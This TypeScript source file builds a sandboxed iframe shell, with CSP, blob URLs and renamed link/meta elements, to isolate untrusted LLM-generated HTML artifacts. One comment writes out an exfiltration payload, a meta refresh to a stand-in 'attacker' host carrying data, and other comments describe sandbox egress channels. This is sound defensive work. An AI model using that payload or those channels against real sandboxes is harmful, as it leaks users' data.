// Copyright Thales 2026
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

// Compose an agent-produced (untrusted) html + css into ONE self-contained
// document for the Preview iframe (`srcdoc`), the download blob, and the new-tab
// shell. The markup is untrusted LLM output and it MAY run script — an artifact
// needs JS for tabs, animations and interaction.
//
// Script is therefore ISOLATED, not removed. Three browser-enforced mechanisms do
// that, and the third is not optional:
//   1. `sandbox="allow-scripts"` WITHOUT `allow-same-origin` — opaque origin, no
//      reach into the app's DOM, cookies or storage.
//   2. a CSP `<meta>` refusing every subresource fetch (`default-src 'none'`).
//   3. `frame-src blob:` on the ENCLOSING shell, which is what stops the artifact
//      NAVIGATING ITSELF to an attacker URL. A sandboxed frame may always navigate
//      itself and no CSP directive of its own can prevent it (`navigate-to` was
//      specced then dropped), so the control has to sit on the parent document and
//      the artifact has to be loaded from a `blob:` URL for `frame-src` to have a
//      target to match. Measured in Chrome 153: without it, `location.href` to an
//      external host egresses from every scripting path, `file://` included.
// Full rationale: HTML-ARTIFACT-CAPABILITY-RFC.md §4.7.

// Three tokens, deliberately separate even where two share a value today: they
// answer different questions and must be able to move independently.
//
// `allow-same-origin` must NEVER join any of them: paired with `allow-scripts` it
// lets content clear its own sandbox and reach the app origin. Frozen by tests
// here and in HtmlArtifactPane.sandbox.test.tsx.

// The frame hosting our TRUSTED shell. Its bootstrap is a script, so this token
// is structural — it is not a decision about the artifact.
export const SHELL_SANDBOX = "allow-scripts";

// The inner frame, when the team may run script.
export const ARTIFACT_SANDBOX = "allow-scripts";

// The inner frame, when it may not. No token at all: no <script> element, no
// inline handler and no `javascript:` URL executes, by browser guarantee rather
// than by filtering the markup. This is what the retired DOMPurify pass used to
// approximate, and it is stronger — there is nothing left to recognize.
export const STATIC_ARTIFACT_SANDBOX = "";

/** The inner frame's tokens for one team's JavaScript posture. */
export function artifactSandbox(allowJavaScript: boolean): string {
  return allowJavaScript ? ARTIFACT_SANDBOX : STATIC_ARTIFACT_SANDBOX;
}

// `default-src 'none'` blocks every fetch, XHR, WebSocket, frame and remote
// subresource; `webrtc 'block'` closes the one egress API that no fetch directive
// covers. `script-src 'unsafe-inline'` is what lets author JS run at all — inline
// only, never a remote origin, so an artifact stays self-contained and works
// offline. It deliberately omits 'unsafe-eval', so `eval`/`new Function` throw.
// This policy does NOT stop the document navigating itself: that is `frame-src` on
// the shell (see SHELL_CSP).
const CSP_DIRECTIVES =
  "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; " +
  "img-src data:; font-src data:; base-uri 'none'; form-action 'none'; webrtc 'block'";
const CSP_META = `<meta http-equiv="Content-Security-Policy" content="${CSP_DIRECTIVES}">`;

// Neutralize any `</style` sequence in author CSS before it goes inside a <style>
// element. Valid CSS never contains it, so a value that does is trying to break out
// of the raw-text style element into HTML context. That buys little now that the
// markup may carry script anyway — it is kept because it costs one replace and
// keeps the style element well-formed, not as a security boundary. Inserting a
// backslash keeps the HTML parser from seeing a real closing tag; the CSS parser
// treats the residue as an ignorable bad token.
function neutralizeStyleClose(css: string): string {
  return css.replace(/<\/(style)/gi, "<\\/$1");
}

// Make the layout use the viewport width (the panel), so responsive content fits.
const VIEWPORT_META = '<meta name="viewport" content="width=device-width, initial-scale=1">';

// Base "fit-to-width" stylesheet. The Preview iframe is sandboxed WITHOUT
// allow-same-origin, so the app cannot read the content's natural width to
// auto-scale it — instead we constrain the common overflow sources so agent
// markup fits the (often narrow) panel: media capped to 100%, long words/URLs
// wrapped, code/tables kept from pushing the page wide. It is emitted BEFORE the
// author's <style>, so intentional author rules still win (no !important).
const FIT_STYLE =
  "<style>" +
  "html{box-sizing:border-box}" +
  // print-color-adjust:exact so backgrounds/colors survive print-to-PDF (browsers
  // drop them by default); harmless on screen, only affects the print rendering.
  "*,*::before,*::after{box-sizing:inherit;-webkit-print-color-adjust:exact;print-color-adjust:exact}" +
  "html,body{margin:0}body{padding:12px;overflow-wrap:break-word;word-break:break-word}" +
  "img,svg,video,canvas{max-width:100%;height:auto}" +
  "table{max-width:100%}pre{max-width:100%;overflow-x:auto}" +
  "</style>";

/** Head content that opens every composed document, BEFORE any author markup. */
function headInjection(css: string): string {
  const authorStyle = css ? `<style>${neutralizeStyleClose(css)}</style>` : "";
  return `<meta charset="utf-8">${VIEWPORT_META}${CSP_META}${FIT_STYLE}${authorStyle}`;
}

// `<link rel="preconnect">` and `rel="dns-prefetch"` perform no *fetch*, so no CSP
// fetch directive reaches them and they egress a hostname (DNS + SNI) even from a
// frame that cannot run script — measured. The element is RENAMED rather than
// deleted: deletion needs a closing `>` the author can simply withhold, and cutting
// text out can splice a fresh `<link` from what surrounds the hole. Renaming leaves
// an unknown element whatever follows it. Markup that merely DISPLAYS `&lt;link` is
// escaped text and is untouched. This covers markup only — author script can append
// a live one at runtime, an open residual (RFC §4.7).
function defuseLinkElements(html: string): string {
  return html.replace(/<link\b/gi, "<x-link");
}

// `<meta http-equiv="refresh" content="0;url=https://attacker/?d=…">` NAVIGATES the
// document. No CSP fetch directive covers a navigation, and the enclosing
// `frame-src blob:` only guards frames that HAVE a shell around them — the export
// and fit-width measuring frames (htmlArtifactExport.ts) load the composed document
// directly, so they had nothing to stop it. The retired DOMPurify pass used to drop
// `<meta>` outright, which is why removing it opened this.
//
// Renamed rather than deleted, same reasoning as `<link>`: deletion needs a closing
// `>` the author can simply withhold. Author markup has no legitimate use for it —
// our own CSP `<meta>` is injected by `headInjection`, never taken from the author.
function defuseMetaElements(html: string): string {
  return html.replace(/<meta\b/gi, "<x-meta");
}

/**
 * Compose the artifact into one self-contained HTML document string.
 *
 * The author markup (a bare fragment OR a full `<!doctype html>…` document) is
 * ALWAYS placed inside OUR shell's <body>, never spliced into an author-provided
 * <head>/<html>. This guarantees our CSP <meta> is the FIRST thing the parser
 * reaches, so it governs every author subresource AND every author script — a meta
 * CSP only applies to content parsed after it, so anything an author put before
 * their own <head> would otherwise load before the policy took effect.
 *
 * The markup is deliberately NOT sanitized: author script is the point. Isolation
 * comes from the frame sandbox and the CSP above, both browser-enforced. A composed
 * document must never be rendered in a frame that grants `allow-same-origin`.
 *
 * `zoom` (default 1) applies a browser-like zoom to the PREVIEW only, via the CSS
 * `zoom` property so content actually reflows (a wide fixed-width page shrinks to
 * fit when zoomed out, unlike a purely visual transform). Download / open-in-new-tab
 * pass no zoom, so the exported document is always 100%. `zoom` is a clamped number
 * from the viewer's own controls, never user text — no injection surface.
 */
export function composeHtmlDocument(html: string, css: string, zoom = 1): string {
  const zoomStyle = zoom !== 1 ? `<style>html{zoom:${zoom}}</style>` : "";
  const body = defuseMetaElements(defuseLinkElements(html));
  return `<!doctype html><html><head>${headInjection(css)}${zoomStyle}</head><body>${body}</body></html>`;
}

// Discrete zoom stops for the viewer's zoom controls (100% = 1, the default).
export const ZOOM_LEVELS = [0.25, 0.33, 0.5, 0.67, 0.8, 0.9, 1, 1.1, 1.25, 1.5, 1.75, 2, 2.5, 3] as const;

/** The next stop below `z` (clamped at the smallest). */
export function zoomOut(z: number): number {
  const lower = [...ZOOM_LEVELS].reverse().find((level) => level < z);
  return lower ?? ZOOM_LEVELS[0];
}

/** The next stop above `z` (clamped at the largest). */
export function zoomIn(z: number): number {
  const higher = ZOOM_LEVELS.find((level) => level > z);
  return higher ?? ZOOM_LEVELS[ZOOM_LEVELS.length - 1];
}

/** A safe download filename derived from the artifact title (defaults to .html). */
export function artifactFileName(title: string, ext = "html"): string {
  const base = (title || "artifact")
    .trim()
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/^-+|-+$/g, "")
    .slice(0, 60);
  return `${base || "artifact"}.${ext}`;
}

/**
 * Trigger a client-side download of the artifact as one self-contained .html file.
 * The markup is inline on the part, so this is a plain blob save — no network, no
 * bearer (unlike the bearer-protected file downloads of ppt_filler /
 * writable_document).
 *
 * It saves the SANDBOXED SHELL, never the bare composed document: a file opened by
 * double-click is the top document on the `file://` origin with no frame around it,
 * so carrying the artifact one level down inside `sandbox="allow-scripts"` is what
 * keeps the browser-enforced isolation on the one output path that has no
 * application to provide it.
 */
export function downloadHtmlArtifact(html: string, css: string, title: string, allowJavaScript = true): void {
  const doc = sandboxedShellDocument(html, css, 1, allowJavaScript);
  const blob = new Blob([doc], { type: "text/html" });
  const url = URL.createObjectURL(blob);
  const anchor = document.createElement("a");
  anchor.href = url;
  anchor.download = artifactFileName(title);
  document.body.appendChild(anchor);
  anchor.click();
  anchor.remove();
  // Defer the revoke: revoking synchronously right after click() can cancel the
  // download in some browsers (the blob is freed before the save reads it).
  setTimeout(() => URL.revokeObjectURL(url), 0);
}

// The shell's TOP document — trusted and author-free. It exists for two reasons.
//
// It keeps the artifact off its own origin: the artifact may never BE the top
// document, because a `blob:` URL is same-origin with the app and a saved file runs
// on `file://`. And it carries `frame-src blob:`, the only control that stops the
// artifact navigating itself out (see the file header) — which is why the artifact
// is handed to the child frame as a `blob:` URL rather than inline `srcdoc`:
// `frame-src` needs a URL to match, and `about:srcdoc` gives it none.
//
// The shell's policy is INHERITED by the blob: document (CSP propagates across
// local schemes), so it must also carry everything the artifact needs.
const SHELL_CSP = `<meta http-equiv="Content-Security-Policy" content="${CSP_DIRECTIVES}; frame-src blob:">`;
const SHELL_STYLE =
  "<style>html,body{margin:0;height:100%}iframe{display:block;border:0;width:100%;height:100%}</style>";

/**
 * The artifact wrapped in its trusted sandboxed shell — the exact document used for
 * the preview, the new tab and the downloaded file. Exported for unit testing.
 *
 * `zoom` reaches the artifact document unchanged; only the preview passes one.
 */
export function sandboxedShellDocument(html: string, css: string, zoom = 1, allowJavaScript = true): string {
  const composed = composeHtmlDocument(html, css, zoom);
  // Every `<` becomes a `\u003c` escape — same string value, but no `<` left for the
  // HTML tokenizer — so nothing in the artifact can disturb the shell's bootstrap:
  // neither the artifact's own `</script>` (which ended the block during browser
  // testing) nor an unclosed `<!--` before a `<script`, which flips the tokenizer
  // into a state where `</script>` stops closing anything and the bootstrap dies.
  const literal = JSON.stringify(composed).replace(/</g, "\\u003c");
  return (
    `<!doctype html><html><head><meta charset="utf-8">${SHELL_CSP}${SHELL_STYLE}</head>` +
    `<body><iframe id="a" sandbox="${artifactSandbox(allowJavaScript)}" referrerpolicy="no-referrer"></iframe>` +
    `<script>document.getElementById("a").src=` +
    `URL.createObjectURL(new Blob([${literal}],{type:"text/html"}));</script>` +
    `</body></html>`
  );
}

/**
 * Whether the artifact carries anything the browser would execute — a `<script>`
 * element, an inline `on*` handler, or a `javascript:` URL.
 *
 * Parsed rather than pattern-matched, because only a parser separates markup from
 * text: a tutorial artifact that DISPLAYS `onclick="…"` inside a `<pre>` must not
 * trip the warning, and the self-closing `<script/>` (a real, executing element
 * once parsed) must. Runs once per export click, never on a render path.
 *
 * A UI hint only: the PNG/PDF export rasterizes a frame that cannot run script, so
 * a JS-driven artifact captures its pre-script state and the viewer says so. Never
 * a security boundary — that is the sandbox's job.
 */
export function artifactHasScript(html: string): boolean {
  const doc = new DOMParser().parseFromString(html, "text/html");
  if (doc.querySelector("script")) return true;
  // A `javascript:` URL runs on activation, and `script-src 'unsafe-inline'` permits it.
  const hrefs = Array.from(doc.querySelectorAll("[href]"));
  if (hrefs.some((el) => /^\s*javascript:/i.test(el.getAttribute("href") ?? ""))) return true;
  return Array.from(doc.querySelectorAll("*")).some((el) =>
    el.getAttributeNames().some((name) => name.startsWith("on")),
  );
}

/**
 * Open the artifact full-size in a new browser tab — the escape hatch for content
 * too wide for the side panel. Loads a blob: URL of the sandboxed-shell document,
 * opened with `noopener` so it cannot reach `window.opener`.
 */
export function openHtmlArtifactInNewTab(html: string, css: string, allowJavaScript = true): void {
  const blob = new Blob([sandboxedShellDocument(html, css, 1, allowJavaScript)], {
    type: "text/html",
  });
  const url = URL.createObjectURL(blob);
  window.open(url, "_blank", "noopener,noreferrer");
  // Keep the URL alive long enough for the new tab to load, then free it.
  setTimeout(() => URL.revokeObjectURL(url), 60_000);
}
